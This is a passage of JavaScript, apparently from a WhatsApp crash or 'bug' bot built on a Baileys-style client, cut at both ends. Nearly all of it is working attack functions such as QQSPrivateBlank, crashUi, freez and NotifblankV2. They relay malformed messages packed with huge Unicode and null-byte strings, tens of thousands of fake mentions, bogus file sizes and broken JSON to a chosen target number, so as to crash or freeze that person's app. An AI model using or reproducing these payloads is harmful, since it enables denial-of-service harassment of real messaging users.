    sendToGroups(`🟣 *Status Panel:*\n${pesan}`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("Gagal kirim status ke Telegram:", err.message);
  }
}

// Kirim notifikasi saat server aktif
kirimStatusServer("✅ Server aktif dan berjalan normal.");

// Kirim notifikasi sebelum restart
setInterval(() => {
  kirimStatusServer("♻️ Panel akan *restart otomatis* untuk menjaga kestabilan...");
  console.log("♻️ Auto restarting panel...");
  setTimeout(() => {
    process.exit(0); // memicu restart otomatis di panel
  }, 5000); // beri jeda 5 detik agar pesan terkirim dulu
}, RESTART_INTERVAL);

async function QQSPrivateBlank(vinzzoffc, target) {
  const QQS = `_*~@2~*_\n`.repeat(10500);
  const Private = 'ꦽ'.repeat(5000);

  const message = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "Pembasmi Kontol",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: '˚₊·— ͟͞͞♡𝙌𝙌𝙎 제 𝙊𝙢𝙝𝙘𝙎𝙞𝙡𝙚𝙣𝙘𝙚' + QQS + Private,
          },
          footer: {
            text: '',
          },
          contextInfo: {
            mentionedJid: [
              "15056662003@s.whatsapp.net",
              ...Array.from(
                { length: 30000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "bokep.com",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: "",
              },
            },
          },
        },
      },
    },
  };

  await vinzzoffc.relayMessage(target, message, { participant: { jid: target } });

  let baten = [];
  const buttonss = [
    { name: "single_select", buttonParamsJson: "" }
  ];

  for (let i = 0; i < 10; i++) {
    baten.push(
 { name: "cta_call",    buttonParamsJson: JSON.stringify({ status: true }) },
 { name: "cta_copy",    buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
 { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) }
    );
  }

  const stxview = {
    viewOnceMessage: {
 message: {
   interactiveMessage: {
 contextInfo: {
   participant: target,
  mentionedJid: [
    "0@s.whatsapp.net",
    ...Array.from(
 { length: 1900 },
 () =>
   "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
    ),
  ],
   remoteJid: "X",
   participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
   stanzaId: "123",
   quotedMessage: {
 paymentInviteMessage: {
   serviceType: 3,
   expiryTimestamp: Date.now() + 1814400000
 },
 forwardedAiBotMessageInfo: {
   botName: "META AI",
   botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
   creatorName: "Bot"
 }
 }
    },
     carouselMessage: {
  messageVersion: 1,
  cards: [
    {
 header: {
   hasMediaAttachment: true,
   imageMessage: {
    url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
    fileLength: "9999999999999",
    height: 9999,
    width: 9999,
    mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
    fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
    directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1755254367",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgITEDQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAQIAEBEgEhNR/9oACAEDAQE/AKOiw7YoRELToaGwSM4M5t6b/9k=",
  },
 },
 body: { text: "Cuh" + "\u0000".repeat(5000) },
 nativeFlowMessage: {
   buttons: baten,
   messageParamsJson: "{".repeat(10000)
 }
    }
  ]
     }
   }
 }
    }
  };
  
    await vinzzoffc.relayMessage(target, stxview, {
 messageId: null,
 participant: { jid: target },
 userJid: target
    }),
    await vinzzoffc.relayMessage(target, stxview, {
 messageId: null,
 participant: { jid: target },
 userJid: target
    });

  const Payload = "\u0000".repeat(20000);

  try {
    const message = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "1@newsletter",
            newsletterName:
              "ꦽ".repeat(12000) +
              "ꦾ".repeat(12000),
            jpegThumbnail: null,
            caption:
              "˚₊·— ͟͞͞♡𝙌𝙌𝙎 제 𝙊𝙢𝙝𝙘𝙎𝙞𝙡𝙚𝙣𝙘𝙚?" +
              "ꦾ".repeat(12000) +
              "ꦽ".repeat(12000),
            inviteExpiration: Date.now() + 9999999999,

            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    title: "ChocoMilk",
                    description: "Vevekjanda..",
                  }),
                },
                {
                  name: "order_payment",
                  buttonParamsJson: JSON.stringify({
                    order_id: "ORDER_" + Math.floor(Math.random() * 999999),
                    amount: "9999999",
                    currency: "IDR",
                    note: "Janda" + Payload,
                  }),
                },
                {
                  name: "view_product",
                  buttonParamsJson: Payload,
                },
                {
                  name: "address_message",
                  buttonParamsJson: Payload,
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: Payload,
                },
                {
                  name: "cta_url",
                  buttonParamsJson: Payload,
                  url: "https://wa.me/stickerPack/suki",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: Payload,
                },
              ],
              messageParamsJson: "\n".repeat(1000),
            },
          },

          contextInfo: {
            remoteJid: target,
            participant: target,
            stanzaId: vinzzoffc.generateMessageTag?.(),
          },
        },
      },
    };

    await vinzzoffc.relayMessage(target, message, {
      userJid: target,
    });

    const message1 = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            header: {
              hasMediaAttachment: true,
              locationMessage: {
                degreesLatitude: -6.9992,
                degreesLongitude: 106.81996666,
                name: "",
                address: "\u0007".repeat(2000),
                jpegThumbnail: Buffer.alloc(0),
              },
            },
            body: {
              text: "ꦽ".repeat(2000),
            },
            footer: {
              text: "ꦾ".repeat(10000),
            },

            nativeFlowResponseMessage: {
              buttons: [
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    id: null,
                  }),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    id: null,
                  }),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    url:
                      "https://files.catbox.moe/02bkvo.jpg" +
                      "𑜦𑜠".repeat(10000) +
                      ".com",
                  }),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    copy_code: "𑜦𑜠".repeat(10000),
                  }),
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    icon: "PROMOTION",
                    flow_cta: "haay",
                    flow_message_version: "3",
                  }),
                },
                {
                  name: "payment_method",
                  buttonParamsJson:
                    "{\"currency\":\"XXX\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"4SWMDTS1PY4\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"description\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"const = LuciferXiter\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"const = LuciferXiter\",\"native_payment_methods\":[],\"share_payment_status\":false}",
                },
              ],
              messageParamsJson: JSON.stringify({ meta: "sharelocation" }),
            },
          },
        },
      },
    };

    const msg = {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from(
            { length: 1900 },
            (_, y) => `9${y + 1}@s.whatsapp.net`
          ),
        },
        body: {
          text: "",
          format: "DEFAULT",
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{"flow_cta":"${"\u0000".repeat(900000)}"}`,
          version: 3,
        },
      },
    };

    await vinzzoffc.relayMessage(
      "status@broadcast",
      message1,
      msg,
      {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined,
                  },
                ],
              },
            ],
          },
        ],
      }
    );
  } catch (error) {
    console.log("Error in: " + error);
  }
}

async function Locked(vinzzoffc, target) {
  await vinzzoffc.relayMessage(target, {
   locationMessage: {
    contextInfo: {
      isForwarded: true,
      forwardingScore: 999,
      externalAdReply: {
        title: "location",
        body: "bugger",
        mediaType: 1,
        thumbnail: Buffer.from([0x00]),
        sourceUrl: "https://wa.me/meta",
        renderLargerThumbnail: true,
        showAdAttribution: true
      },
      businessMessageForwardInfo: {
        businessOwnerJid: "0@s.whatsapp.net"
      }
    }
   }
  }, { 
    messageId: vinzzoffc.generateMessageTag(),
    participant: { jid: target } 
  }).catch(() => {});
}

async function crashUi(vinzzoffc, target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              businessMessageForwardInfo: { 
                 businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              quotedMessage: {
                callLogMesssage: {
                  isVideo: false,
                  callOutcome: "ONGOING",
                  durationSecs: "0",
                  callType: "VOICE_CHAT",
                  participants: [
                    {
                      jid: "13135550002@s.whatsapp.net",
                      callOutcome: "CONNECTED"
                    },
                    ...Array.from({ length: 10000 }, () => ({
                      jid: `1${Math.floor(Math.random() * 99999)}@s.whatsapp.net`,
                      callOutcome: "CONNECTED"
                    }))
                  ]
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            header: {
              videoMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQOS7xVULFd5Ekk1T8o8pWSq-j5UmHzUPG5sq0frfEogEtMRJ_FNjaT7rKYUSm-iImapgmKZ7iq5_9_CC8mSbD0me0ye2OcoyDxaqJU?ccb=9-4&oh=01_Q5Aa2AFf2ZI7JiJkIlqsek6JvJAGekHxXtN9qtw95RhN1meW8g&oe=68987468&_nc_sid=e6ed6c&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "pctPKf/IwXKoCzQ7da4YrzWk+K9kaySQuWqfbA8h0FY=",
                fileLength: "847271",
                seconds: 7,
                mediaKey: "dA+Eu1vaexH4OIHRZbL8uZIND+CKA6ykw9B2OrL+DH4=",
                gifPlayback: true,
                height: 1280,
                width: 576,
                fileEncSha256: "GwTECHj+asNIHYh/L6NAX+92ob/LDSP5jgx/icqHWvk=",
                directPath: "/o1/v/t24/f2/m232/AQOS7xVULFd5Ekk1T8o8pWSq-j5UmHzUPG5sq0frfEogEtMRJ_FNjaT7rKYUSm-iImapgmKZ7iq5_9_CC8mSbD0me0ye2OcoyDxaqJU?ccb=9-4&oh=01_Q5Aa2AFf2ZI7JiJkIlqsek6JvJAGekHxXtN9qtw95RhN1meW8g&oe=68987468&_nc_sid=e6ed6c",
                mediaKeyTimestamp: "1752236759",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAGQALQMBIgACEQEDEQH/xAAbAAEAAgMBAQAAAAAAAAAAAAAAAgMBBAYFB//EACsQAAICAQIFAwQCAwAAAAAAAAECAAMRBCEFEhMxUQcUQQYiYXEygUKx8P/EABcBAQEBAQAAAAAAAAAAAAAAAAABAgP/xAAZEQEBAAMBAAAAAAAAAAAAAAAAEQEhQTH/2gAMAwEAAhEDEQA/APgGl4Jq7bbKarOGZcBc366irGWODl3HKfsOc9gRnHMM+PNqxk6NTk6g2tzGwscKT8EH5/MoPOACeYA7g+Z0YqETPMfJjmPkyi/TaezUNVXWaFL2isGy1EALbbliML+TsPIlBjmPkzJDL/IEfuB7vEeFcR4dodFbrPboLUWxUP3MitULKywwQA6OCp/B7FWxqXLxLUXanVGqzVBbCtt/R51LE/JI7kn533nnvdY61K9jstS8tYLEhBknA8DJJ/ZMgSTjJ7bRvosa1+pzMqBtjjpgDt4xiHuZyCRXt4rUf6EqiBY1rNnITcY2QD5z4/7t2mbKLkqrtsqsWq3PTcqQr4ODg/OJVJvY7oiO7MiDCKTkKM5wPG5JkTN4hERKpERAyO8MMEjbbxMRAREQEREBERAREQEREBERARNvQ6CzWLc1dlKCpC7dSwKSNtgO5O/Yb9z2BI1JEIk7UNdj1sVLKSpKsGG3gjY/sSft39p7nmq6fP08dVefOM/wzzY/OMfGcyqxpdPdq9TTptJTZfqLnFddVSlndicBVA3JJOABOp9RvpLjP0nxHS1cb4E/B+vWz1DqrctgDn/NSVLKCoIGDjlJA5t+d4RrdVw7i2i13DrRTrdNel1Fh5cJYrAqfu22IHfbzOs9UvUjjfqHrtG/GvYLVoA6UJoqmSsliOZ/vJYk8q9zjCjYHOVz4mq4gEjOD32MCIhVuptbUXvbYKw7nJFdaov9KoAH9CV4iIEYiIH/2Q==",
                gifAttribution: "NONE"
              },
              hasMediaAttachment: false
            },
            body: {
              text: "ꦾ".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: ""
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    flow_action: "navigate",
                    flow_action_payload: { screen: "CTZ_SCREEN" },
                    flow_cta: "ꦾ".repeat(50000),
                    flow_id: "UNDEFINEDONTOP",
                    flow_message_version: "9.903",
                    flow_token: "UNDEFINEDONTOP"
                  })
                }
              ]
            }
          }
        }
      }
    },
    {}
  );
  await vinzzoffc.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  await vinzzoffc.relayMessage(
    target,
    {
      groupInviteMessage: {
        groupJid: "120363347113453659@g.us",
        inviteCode: "x",
        inviteExpiration: Date.now(),
        groupName: "؂ن؃؄ٽ؂ن؃".repeat(10000),
        caption:"ꦾ".repeat(50000), 
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAGQALQMBIgACEQEDEQH/xAAbAAEAAgMBAQAAAAAAAAAAAAAAAgMBBAYFB//EACsQAAICAQIFAwQCAwAAAAAAAAECAAMRBCEFEhMxUQcUQQYiYXEygUKx8P/EABcBAQEBAQAAAAAAAAAAAAAAAAABAgP/xAAZEQEBAAMBAAAAAAAAAAAAAAAAEQEhQTH/2gAMAwEAAhEDEQA/APgGl4Jq7bbKarOGZcBc366irGWODl3HKfsOc9gRnHMM+PNqxk6NTk6g2tzGwscKT8EH5/MoPOACeYA7g+Z0YqETPMfJjmPkyi/TaezUNVXWaFL2isGy1EALbbliML+TsPIlBjmPkzJDL/IEfuB7vEeFcR4dodFbrPboLUWxUP3MitULKywwQA6OCp/B7FWxqXLxLUXanVGqzVBbCtt/R51LE/JI7kn533nnvdY61K9jstS8tYLEhBknA8DJJ/ZMgSTjJ7bRvosa1+pzMqBtjjpgDt4xiHuZyCRXt4rUf6EqiBY1rNnITcY2QD5z4/7t2mbKLkqrtsqsWq3PTcqQr4ODg/OJVJvY7oiO7MiDCKTkKM5wPG5JkTN4hERKpERAyO8MMEjbbxMRAREQEREBERAREQEREBERARNvQ6CzWLc1dlKCpC7dSwKSNtgO5O/Yb9z2BI1JEIk7UNdj1sVLKSpKsGG3gjY/sSft39p7nmq6fP08dVefOM/wzzY/OMfGcyqxpdPdq9TTptJTZfqLnFddVSlndicBVA3JJOABOp9RvpLjP0nxHS1cb4E/B+vWz1DqrctgDn/NSVLKCoIGDjlJA5t+d4RrdVw7i2i13DrRTrdNel1Fh5cJYrAqfu22IHfbzOs9UvUjjfqHrtG/GvYLVoA6UJoqmSsliOZ/vJYk8q9zjCjYHOVz4mq4gEjOD32MCIhVuptbUXvbYKw7nJFdaov9KoAH9CV4iIEYiIH/2Q=="
      }
    },
    {
      participant: { jid: target },
      ephemeralExpiration: 5,
      timeStamp: Date.now()
    }
  );
}

async function freez(vinzzoffc, target) {
    await vinzzoffc.relayMessage(
        target,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    videoMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/641610487_1446846757033283_2569361697473754136_n.enc?ccb=11-4&oh=01_Q5Aa3wEungB1hAjqnphK_bpLvMxlTkyWtniorOPgl_8OerdVqA&oe=69C6B9B1&_nc_sid=5e03e0&mms3=true",
                        mimetype: "video/mp4",
                        fileSha256: "Zs2wV//IMZTRU65eYtIyJnwpnP0ezH6Y3iGCAostwTE=",
                        fileLength: "3071735",
                        seconds: 27,
                        mediaKey: "62R87Wxh7Kif/OxF56uVuIQB4zKK/gX0e4bD+YRQ848=",
                        height: 850,
                        width: 478,
                        fileEncSha256: "w1ZN8WBbuDYaF3tDwYypvSw3/WsRfK1/HxvYUU2cz24=",
                        directPath: "/v/t62.7161-24/641610487_1446846757033283_2569361697473754136_n.enc?ccb=11-4&oh=01_Q5Aa3wEungB1hAjqnphK_bpLvMxlTkyWtniorOPgl_8OerdVqA&oe=69C6B9B1&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1772045506",
                        contextInfo: {
                            pairedMediaType: "NOT_PAIRED_MEDIA",
                            forwardingScore: 999,
                            isForwarded: true,
                            businessMessageForwardInfo: {
                                businessOwnerJid: "13135550202@s.whatsapp.net"
                            },
                            mentionedJid: Array.from(
                                { length: 2000 },
                                (_, i) => `628${i + 1}990${i + 1}@s.whatsapp.net`
                            )
                        },
                        streamingSidecar: "k4mWMLH2XG7MaWWMPxHpyTWcy3EdAsQ4VsCTFKvN1joH3KP2KlmEF4iXYbg1WuMLPzne9x9g5RrS1ibmUNpYZPcBOSt/wcIUBTKkcqGNUfjwUs8Jdj0b5elKziKDUt3loL6lgir+JABokXOYe2Q4Fv1g/1RH6dmf3VQVnZuLPO6dnuIAgXkBpF/qgH/rec0EyuELdJP96gbNPCDVP2XS7mgTqHdE1rtMAUyKXMUL355zDqZB98FbOGRLOILMV38JArlx6OjyzAWG3CZldLxNKeRJM36jveZpmyPOKTXO1XA9qNtu44QZ37GvAAs0whw5/I2/7u5rMQjhixsPY9HUd82K0VccCSpUm/JI0D7bzZQyr9yw6glTL4/Ab3v/AquQzXeqvos9TnMvn0ByaXE18NzQD0Lrrfza9FHR+5+WpKYc0dYyslkx2Zp/+z+oPn1ambW+tKjyax2e8hAAGoVZa8AurpMhPvEYswAK6kmn3aeXim9LMhPKrHDMLIKhu4WBd4N3wD/9ZK+2uo1o7gLIp5TlGAhdsfOe6+ca5xyAwADWBhiHJdZw06+DKzAgtsfUb+Maem9kS1gptGReIGBGKFM66Xdl0Ai8cpFUfeOSInirURiDqFE=",
                        thumbnailDirectPath: "/v/t62.36147-24/534810281_908969998546564_3603710379076274248_n.enc?ccb=11-4&oh=01_Q5Aa3wGrAdvK5r0cUN_BG-nLQOqJPh3lVENsZ1PVDgqDfhvZkg&oe=69C6AA84&_nc_sid=5e03e0",
                        thumbnailSha256: "4LuL0s28LcE+8dW4mYG+GLYw8yl3LZ4QPPhaARkfBmU=",
                        thumbnailEncSha256: "5gnHasnQkNxJjqswSQDKyEXJ6SW5tvwCcPZqw22EbQ4=",
                        annotations: [
                            {
                                polygonVertices: [
                                    { x: 0.020762423053383827, y: 0.27248817682266235 },
                                    { x: 1.0120298862457275, y: 0.29351872205734253 },
                                    { x: 0.9789597988128662, y: 0.7867149114608765 },
                                    { x: -0.012307574972510338, y: 0.7656844258308411 }
                                ],
                                shouldSkipConfirmation: true,
                                embeddedContent: {
                                    embeddedMusic: {
                                        musicContentMediaId: "1418069422677984",
                                        songId: "292111031335475",
                                        author: "᬴".repeat(60000),
                                        title: "᬴".repeat(60000),
                                        artworkDirectPath: "/v/t62.76458-24/56159361_1438661814433677_4172681711438316939_n.enc?ccb=11-4&oh=01_Q5Aa3wHk897EFVmByrMkQR1h_MfpZvXGkXhfIcaKVZBRcpkPEQ&oe=69C6A397&_nc_sid=5e03e0",
                                        artworkSha256: "yI2uyPuiJkVQP1YCijKWG9DRBy3BgwT3imlyTD3x96k=",
                                        artworkEncSha256: "rKdmZDKB4sQ98ZDrla2bLNc4bkuEDMoh3pbz9CFYeUQ=",
                                        artistAttribution: "https://www.instagram.com/_u/rexorangecounty",
                                        countryBlocklist: "UlU=",
                                        isExplicit: true,
                                        artworkMediaKey: "7Wi7CS7NSKztYzdpaJQNrwtOff4X6Rkh094l3ciNWGc="
                                    }
                                },
                                embeddedAction: true
                            }
                        ]
                    }
                }
            }
        },
        {
            participant: { jid: target }
        }
    );
}

async function NotifblankV2(vinzzoffc, target, ptcp = true) {
  await vinzzoffc.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "\u200B",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
